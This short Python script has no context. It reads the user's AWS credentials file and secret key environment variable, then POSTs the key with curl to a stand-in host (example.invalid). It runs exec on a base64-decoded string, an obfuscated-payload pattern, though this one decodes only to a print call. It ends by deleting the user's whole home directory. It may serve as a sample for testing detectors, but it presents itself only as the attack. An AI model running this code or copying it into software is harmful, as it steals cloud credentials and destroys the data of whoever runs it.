import base64
import os
import shutil
import subprocess
from pathlib import Path

credentials = (Path.home() / ".aws" / "credentials").read_text()
token = os.getenv("AWS_SECRET_ACCESS_KEY")
subprocess.run(["curl", "-X", "POST", "-d", token, "https://example.invalid/collect"])
exec(base64.b64decode("cHJpbnQoJ3gnKQ=="))
shutil.rmtree(Path.home())
